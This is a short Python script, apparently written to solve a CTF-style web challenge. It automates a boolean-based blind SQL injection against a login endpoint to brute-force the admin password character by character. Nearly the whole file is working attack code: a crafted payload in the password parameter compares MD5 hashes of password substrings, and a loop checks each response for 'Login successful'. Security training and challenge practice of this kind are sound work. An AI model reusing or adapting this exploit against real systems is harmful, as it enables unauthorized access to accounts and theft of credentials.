#!/usr/bin/python3

from pwn import *
import requests, signal, pdb, sys, time, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "https://warzone.wsg127.com"
characters = string.ascii_letters+ string.digits + "{}"

def makeSQLI():

    data = ""

    p1 = log.progress("Obteniendo el password del usuario Admin")
    p1.status("Iniciando proceso de fuerza bruta...")

    time.sleep(2)

  

    for position in range(1, 50):
        for character in characters:
            
            payload = "https://warzone.wsg127.com/sqlichallenges/sql3?username=\&password=+or+if((select+md5(substring(password, 1," + str(position) + "))+from+users+where+username=\"admin\")=md5(\"" +data+ character + "\"),1,0)%23"
        
            
            p1.status(data)
            r = requests.get(payload)
            if "Login successful" in r.text:
                data += character
                p1.status(data)
                break
            

            
if __name__ == '__main__':
    print("Cuando tengas la flag Ctrl+C para salir...") 
    makeSQLI()
